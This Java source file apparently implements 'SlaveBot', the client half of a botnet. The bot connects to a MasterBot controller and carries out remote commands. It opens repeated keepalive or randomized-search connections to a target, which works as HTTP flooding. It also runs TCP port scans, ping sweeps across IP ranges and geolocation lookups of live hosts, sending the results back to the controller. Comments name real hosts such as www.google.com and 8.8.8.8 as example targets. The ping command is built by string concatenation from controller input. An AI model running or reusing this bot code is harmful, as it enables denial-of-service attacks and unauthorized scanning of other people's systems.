/**
 * Program: SlaveBot
 * Author: Tse-Jen LU
 */

import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.net.UnknownHostException;
import java.security.SecureRandom;
import java.io.InputStreamReader;


public class SlaveBot
{
    private Socket socket              = null;
    private Thread thread              = null;
    private DataInputStream  console   = null;
    private DataOutputStream streamOut = null;
    private SlaveBotThread slaveThread = null;
    private ArrayList<Socket> connectOuts = new ArrayList<Socket>();
    private String[] commands;
    private String[] IP_addr;
    private String[] IP_addr_begin;
    private String[] IP_addr_end;
    private String[] PortRange;
    Socket socketToTarget;
    static SecureRandom rnd = new SecureRandom();

    public SlaveBot (String hostname, int port)
    {
        System.out.println("Connecting to the ServerBot: " + hostname + " || " + port );
        try
        {
            //create a socket and connect to host
            socket = new Socket(hostname, port);
            System.out.println("Connected: " + socket);
            start();
        }
        catch(UnknownHostException uhe)
        {  /*System.out.println("Host unknown: " + uhe.getMessage()); */}
        catch(IOException ioe)
        {  /*System.out.println("Unexpected exception: " + ioe.getMessage()); */}
    }

    public void start() throws IOException
    {
        console   = new DataInputStream(System.in);
        streamOut = new DataOutputStream(socket.getOutputStream());
        if (thread == null)
        {
            slaveThread = new SlaveBotThread(this, socket);
        }
    }

    public void stop()
    {
        try
        {
            if (thread != null)
            {
                thread.join();
                thread = null;
            }
            if (console   != null)  console.close();
            if (streamOut != null)  streamOut.close();
            if (socket    != null)  socket.close();
        }
        catch(Exception ioe)
        {  System.out.println("Error closing ..."); }

        slaveThread.close();
        slaveThread.stop();
    }


    public void SendtoResponsedIPtoMasterBot (int a, int b, int c, int d) throws UnknownHostException, IOException {
        if(a==7777777){
            streamOut.writeUTF("IP scan done.");
        }else if(a==666666){
            streamOut.writeUTF("IP scan done. There is no alive IP detected.");
        }        else {
            String IP_Address_a = Integer.toString(a);
            String IP_Address_b = Integer.toString(b);
            String IP_Address_c = Integer.toString(c);
            String IP_Address_d = Integer.toString(d);
            String MakeDot = ".";
            String IP_Address = IP_Address_a + MakeDot + IP_Address_b + MakeDot + IP_Address_c + MakeDot + IP_Address_d;
            streamOut.writeUTF(IP_Address);  //return IP Address to MasterBot
        }
    }

    public void SendtoResponsedPorttoMasterBot (int a) throws UnknownHostException, IOException {
        if(a==666666){
            streamOut.writeUTF("TCP Port scan done. There is no open port detected.");
        }else if(a==7777777){
            streamOut.writeUTF("TCP Port scan done.");
        }
        else{
            String RespondPort = " " + a + " ";
            streamOut.writeUTF(RespondPort);
        }
    }

    public String StringGen(){
        int[] A = new int[9];

        for(int i = 0; i < 9; i++){
            if(i < 3){
                A[i]=(int)((Math.random()*10)+48);
            }else if(i < 4){
                A[i] = (int)(((Math.random()*26) + 65));
            }else{
                A[i] = ((int)((Math.random()*26) + 97));
            }
        }

        String RandString = "";
        for(int i = 0; i < 8; i++){
            RandString = RandString + (char)A[i];
        }
        return RandString;
    }

    public void GetGeoLocation(String ipAddress) throws Exception {
        String GeoIp = ipAddress;
            URL oracle = new URL("http://freegeoip.net/xml/" + GeoIp);
            BufferedReader in = new BufferedReader(new InputStreamReader(oracle.openStream()));

            String inputLine;
            String outputline = null;
            System.out.println("The Address of " + GeoIp + " is");
            while ((inputLine = in.readLine()) != null) {
                if(inputLine.contains("404 page not found")){
                    outputline = "Invalid IP address.";
                    break;
                }
                if (inputLine.contains("CountryName")) {
                    String[] CountryName = inputLine.split("[<\\>]");
                    outputline = "CountryName:" + CountryName[2] + " || ";
                }
                if (inputLine.contains("RegionName")) {
                    String[] RegionName = inputLine.split("[<\\>]");
                    outputline += "RegionName:" + RegionName[2] + " || ";
                }
                if (inputLine.contains("City")) {
                    String[] City = inputLine.split("[<\\>]");
                    outputline += "City:" + City[2] + " || ";
                }
                if (inputLine.contains("ZipCode")) {
                    String[] ZipCode = inputLine.split("[<\\>]");
                    outputline += "ZipCode:" + ZipCode[2] + " || ";
                }
                if (inputLine.contains("Latitude")) {
                    String[] Latitude = inputLine.split("[<\\>]");
                    outputline += "Latitude:" + Latitude[2] + " || ";
                }
                if (inputLine.contains("Longitude")) {
                    String[] Longitude = inputLine.split("[<\\>]");
//                System.out.println(inputLine);
//                System.out.println("Longitude:"+Longitude[2] );
                    outputline += "Longitude:" + Longitude[2];
                }
            }
            System.out.println(outputline);
            streamOut.writeUTF(outputline);
            in.close();
    }

    public void handle(String command) throws UnknownHostException, IOException  {

        commands = command.split(" ");
        System.out.println(command);
        switch (commands[0]) {
            //connect all www.google.com 80 3
            //connect all www.google.com 80 1 keepalive
            //connect all www.google.com 80 1 url=/#q=
            case "connect":
                boolean keepalive = false;
                boolean Search = false;
                int NumberOfConnection = 1;
                String KAV = "";
//                Socket socketToTarget;
                if( commands.length >= 5 && !commands[4].contains("li") && !commands[4].contains("=/#q") ){
                    NumberOfConnection = Integer.parseInt(commands[4]);
                }

                if((commands.length == 5 && commands[4].contains("li")) || (commands.length == 6 && commands[5].contains("li"))){
                    System.out.println("-----------keepalive----------");
                    keepalive = true;
                    KAV = "KeepAlive";
                }else if((commands.length == 5 && commands[4].contains("=/#q")) || (commands.length == 6 && commands[5].contains("=/#q"))){
                    System.out.println("------------Search------------");
                    Search = true;
                }

                for(int i = 0; i < NumberOfConnection; i++) {
                    socketToTarget = new Socket(commands[2], Integer.parseInt(commands[3]));

                    if(keepalive) {
                         socketToTarget.setKeepAlive(true);
                     }
                     try {
                        connectOuts.add(socketToTarget);
                        System.out.println(socketToTarget);
                        String url= "http://" + commands[2];
                        if(Search){
                            String RandString= StringGen();
                            url = url + "/#q=" + RandString;
                        }

                        URL TargetURL = new URL(url);
                        HttpURLConnection con = (HttpURLConnection) TargetURL.openConnection();
                        int responseCode = con.getResponseCode();
                        System.out.println("Response Code : " + responseCode + " " + KAV);

                        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                        String inputLine;
                        StringBuffer response = new StringBuffer();
                        while ((inputLine = in.readLine()) != null) {
                            response.append(inputLine + "\n");
                        }
                        System.out.println(response.toString());
                        int j = i+1;
                        streamOut.writeUTF( j+ ". connect to " + url + " || " + commands[3] + " || Responsed Code: " + responseCode + " || " + KAV);
                        in.close();

                    } catch (UnknownHostException uhe) {
                        System.out.println("Host unknown: " + uhe.getMessage());
                    } catch (IOException ioe) {
                        System.out.println("Unexpected exception: " + ioe.getMessage());
                    }
                }
                    break;

            //disconnect all www.google.com 80
            case "disconnect":
                System.out.println("Disconnect " + commands[2]);
                int times = connectOuts.size();
                for(int i = 0; i < times ; i++)
                {
                    if(connectOuts.get(i).getRemoteSocketAddress().toString().contains(commands[2])) {
                        try {
                            connectOuts.get(i).close();
                            System.out.println("Disconnect to " + commands[2]);
                            streamOut.writeUTF("Disconnect to " + commands[2]);
                        } catch (IOException ioe) {
//                            System.out.println("Error closing: " + ioe);
                        }
                    }
                }
//                streamOut.writeUTF("done.");
                break;

            //tcpportscan all 127.0.0.1 1000-2000
            //tcpportscan all 216.58.194.174 79-81
            //tcpportscan all www.google.com 79-81
            case "tcpportscan":
                int portCount = 0;
                System.out.println("TCP Port scanning");
                String ip = commands[2];
                PortRange = commands[3].split("-");
                System.out.println("ip: " + ip + "  ,PortRange: " + PortRange[0] + "~" + PortRange[1]);
                for( int portNumber = Integer.parseInt(PortRange[0]); portNumber <= Integer.parseInt(PortRange[1]); portNumber++) {
                    try {
                        Socket portScan = new Socket();
                        portScan.connect(new InetSocketAddress(ip, portNumber), 66);
                        portScan.close();
                        System.out.println("Port " + portNumber + " is open");
                        SendtoResponsedPorttoMasterBot (portNumber);
                        portCount++;
                    }catch (ConnectException ce){
//                            System.out.println(portNumber +" is not available");
                    }catch (Exception e){
//                            e.printStackTrace();
                    }
                }
                if(portCount==0){
                    SendtoResponsedPorttoMasterBot(666666); //There is no port responed.
                }else{
                    SendtoResponsedPorttoMasterBot(7777777); //Finished
                }
                System.out.println("Done.");
//                streamOut.writeUTF("Done.");
                break;



            //MasterBot > ipscan all 66.249.84.20-66.249.84.30
            //MasterBot > ipscan all 8.8.8.8-8.8.8.9
            //MasterBot > ipscan all 127.0.0.1-127.0.0.10
            case "ipscan":
                IP_addr = commands[2].split("-");
                IP_addr_begin = IP_addr[0].split("\\.");
                IP_addr_end = IP_addr[1].split("\\.");

                int response_count = 0;
                for (int i = Integer.parseInt(IP_addr_begin[0]); i <= Integer.parseInt(IP_addr_end[0]); i++) {
                    for (int j = Integer.parseInt(IP_addr_begin[1]); j <= Integer.parseInt(IP_addr_end[1]); j++) {
                        for (int m = Integer.parseInt(IP_addr_begin[2]); m <= Integer.parseInt(IP_addr_end[2]); m++) {
                            for (int n = Integer.parseInt(IP_addr_begin[3]); n <= Integer.parseInt(IP_addr_end[3]); n++) {

                                //Method 1. use "sudo"
//                                InetAddress inet;
//                                inet = InetAddress.getByAddress(new byte[] { (byte) i, (byte) j, (byte) m, (byte) n });
//                                System.out.println("Sending Ping Request to: " + inet);
//                                System.out.println(inet.isReachable(5000) ? (i + "." + j + "." + m + "." + n + " is reachable") : i + "." + j + "." + m + "." + n + "  is NOT reachable");
//
//                                if(inet.isReachable(5000)) {
//                                    SendtoResponsedIPtoMasterBot(i,j,m,n);
//                                    response_count++;
//                                }
                                //Method 1. END

                                //Method 2.
                                String ipAddress = i + "." + j + "." + m + "." +n;
                                String line = null;
                                String word = "1 received";
                                Boolean found;
                                try {
                                    Process pro = Runtime.getRuntime().exec("ping " + ipAddress + " -c " + 1 + " -w " + 5); //For Linux
//                                    Process pro = Runtime.getRuntime().exec("ping " + ipAddress + " -n " + 1 + " -w " + 5000); //For Windows
                                    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
                                    while ((line = buf.readLine()) != null) {
                                        System.out.println(line);
                                        String text = line;
                                        found = text.contains(word);
                                        if (found) {
                                            System.out.println("Get!!!!! ");
                                            SendtoResponsedIPtoMasterBot(i,j,m,n);
                                            response_count++;
                                        }
                                    }
                                } catch (Exception ex) {
                                    System.out.println(ex.getMessage());
                                }
                            }
                        }
                    }
                }
                if(response_count==0){
                    SendtoResponsedIPtoMasterBot(666666, 0, 0, 0); //response_count==0
                }else {
                    SendtoResponsedIPtoMasterBot(7777777, 0, 0, 0); //Done
                }
                System.out.println("Done.");
//                streamOut.writeUTF("Done.");
                break;

            case "geoipscan":
//                MasterBot > geoipscan all 66.249.84.20-66.249.84.30
                IP_addr = commands[2].split("-");
                IP_addr_begin = IP_addr[0].split("\\.");
                IP_addr_end = IP_addr[1].split("\\.");
                String GeoIp = " ";
                for (int n = Integer.parseInt(IP_addr_begin[3]); n <= Integer.parseInt(IP_addr_end[3]); n++) {
                    String ipAddress = IP_addr_begin[0] + "." + IP_addr_begin[1] + "." + IP_addr_begin[2] + "." + n;
                    String line = null;
                    String word = "1 received";
                    Boolean found;
                    try {
//                        Process pro = Runtime.getRuntime().exec("ping " + ipAddress + " -n " + 1 + " -w " + 5000);//For Windows
                        Process pro = Runtime.getRuntime().exec("ping " + ipAddress + " -c " + 1 + " -w " + 5);//For Linux**************************
                        BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
                        while ((line = buf.readLine()) != null) {
                            System.out.println(line);
                            String text = line;
                            found = text.contains(word); //----------------For Linux************************************
//                            found = text.contains("0% loss"); // ----------------For Windows*********************************
                            if (found) {
                                System.out.println("Get!!!!! ");
                                SendtoResponsedIPtoMasterBot(Integer.parseInt(IP_addr_begin[0]), Integer.parseInt(IP_addr_begin[1]), Integer.parseInt(IP_addr_begin[2]), n);
                                GetGeoLocation(ipAddress);
                            }
                        }
                    } catch (Exception ex) {
                        System.out.println(ex.getMessage());
                    }

                }
                System.out.println("Done.");
                streamOut.writeUTF("Done.");
        break;

            default:
                System.out.println("Incorrect command.");
                System.out.println("Please try \"connect\", \"disconnect\", \"tcpportscan\", \"ipscan\", \"geoipscan\"" );
                break;
        }
    }

    public static void main(String args[])
    {
        SlaveBot slavebot = null;
        if (args.length != 4)
        {
            System.out.println("Incorrect command.");
            System.out.println("Command is: java SlaveBot -h hostname -p port");
        }
        else
            slavebot = new SlaveBot(args[1], Integer.parseInt(args[3]));
    }
}